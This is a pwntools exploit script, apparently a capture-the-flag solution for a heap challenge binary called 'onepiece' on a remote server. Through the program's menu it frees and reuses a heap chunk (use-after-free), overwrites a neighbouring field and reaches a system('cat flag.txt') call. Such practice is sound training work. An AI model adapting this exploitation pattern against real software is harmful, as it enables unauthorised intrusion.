#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 13.214.13.126 --port 38823 ./onepiece
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./onepiece')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '13.214.13.126'
port = int(args.PORT or 38823)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x00005555555554c2
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# malloc(32) wg and malloc(36) kaizoku
io.sendlineafter("Laugh_tale\n","3")

# free wg
io.sendlineafter("Laugh_tale\n","6")
io.sendlineafter("?\n","4")

# malloc(32) robin and read_poneglyph = 1
io.sendlineafter("Laugh_tale\n","7")

# UAF wg then overwrite 0x6F726F7A kaizoku+32
io.sendlineafter("Laugh_tale\n","8")
p ='a'*(32 + 16 + 32)
p += p64(0x6F726F7A)
io.sendlineafter("wano??\n",p)

# system("cat flag.txt")
io.sendlineafter("Laugh_tale\n","9")

io.interactive()

